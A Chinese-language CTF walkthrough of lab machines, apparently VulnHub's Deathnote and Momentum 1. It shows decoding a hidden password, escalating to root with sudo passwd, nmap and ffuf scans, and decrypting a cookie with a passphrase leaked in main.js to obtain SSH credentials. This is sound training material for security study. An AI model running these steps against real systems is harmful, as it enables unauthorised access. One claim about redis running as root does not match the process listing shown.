++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.
```

```
i think u got the shell , but you wont be able to kill me -kira
```



文件 /opt/L/fake-notebook-rule/case.wav 内容为 16 进制

```
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
```



文件 /opt/L/fake-notebook-rule/hint 提示使用 cyberchef 进行解码

```
use cyberchef
```



使用 cyberchef 的魔法功能进行编码识别，密码为 **kiraisevil**

![image-20250305125832566](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250305125832566.png)

![image-20250305125843254](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250305125843254-1741150724551-5.png)



切换到 kira 用户，登录成功

```
l@deathnote:/etc/apache2$ su kira
Password: 
kira@deathnote:/etc/apache2$ 
```



查看 kira 用户的 sudo 权限，可以执行任何命令

```
kira@deathnote:/etc/apache2$ sudo -l 
[sudo] password for kira: 
Matching Defaults entries for kira on deathnote:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
```



修改 root 用户密码

```
kira@deathnote:/etc/apache2$ sudo passwd root
New password: 
Retype new password: 
passwd: password updated successfully
```



切换到 root 用户

```
kira@deathnote:/etc/apache2$ su root
Password: 
root@deathnote:/etc/apache2# 
```



### Momentum：1

Nmap 扫描端口

```
db_nmap -sS -sV -p- -r -n -O -T 5 10.10.10.102
```

```
host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.102  22    tcp    ssh   open   OpenSSH 7.9p1 Debian 10+deb10u2 protocol 2.0
10.10.10.102  80    tcp    http  open   Apache httpd 2.4.38 (Debian)
```



通过浏览器访问网站，使用 Wappalyzer 识别网站使用了 PHP 语言。

在浏览器中进行简单交互，发现其涉及到数据库查询，但是此处无 SQL 注入。

![image-20250306154124850](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250306154124850.png)





使用 FFUF 工具爆破网站 URL

```
ffuf -u http://10.10.10.102/FUZZ -w raft-large-directories-lowercase.txt
```

```
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 0ms]
manual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 247ms]
img                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 986ms]
:: Progress: [56162/56162] :: Job [1/1] :: 2597 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```



经过手工检查 manual、css 和 img 路径正常，js 路径下存在 main.js 文件。

```
curl http://10.10.10.102/js/main.js
```

```
function viewDetails(str) {

  window.location.href = "opus-details.php?id="+str;
}

/*
var CryptoJS = require("crypto-js");
var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
console.log(decrypted.toString(CryptoJS.enc.Utf8));
*/
```



该代码属于典型的AES-CBC模式解密实现，适用于解密通过CryptoJS默认配置加密的数据，这里设置了密码为`SecretPassphraseMomentum` 。

在测试过程中发现网站下发了一个 cookie，尝试使用改密码进行解密，解密后的结果为：`auxerre-alienum##` 。

![image-20250306155006262](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250306155006262.png)

![image-20250306155028985](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250306155028985.png)

解密网站：https://stackblitz.com/edit/cryptojs-aes-encrypt-decrypt?file=index.js



使用 node 进行解密

```
npm install crypto-js

added 1 package in 2s
```

```
node 

Welcome to Node.js v20.14.0.
Type ".help" for more information.
> var CryptoJS = require("crypto-js");
undefined

> encrypted = "U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt"
'U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt'

> var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
undefined

> console.log(decrypted.toString(CryptoJS.enc.Utf8));
auxerre-alienum##
undefined
```



尝试使用线索 **auxerre-alienum##** 通过 ssh 进行登录，测试发现用户名为 **auxerre** ，密码为**原始字符串（auxerre-alienum##）**。

查看进程发现以 root 用户运行 redis 进程。

```
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
redis      519  0.1  0.5  57304 12020 ?        Ssl  02:40   0:31 /usr/bin/redis-server 127.0.0.1:6379
```



经过进一步研究，可以连接到它并查看其内容，经测试，该密码为 root 密码。

![image-20250306160617837](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250306160617837.png)

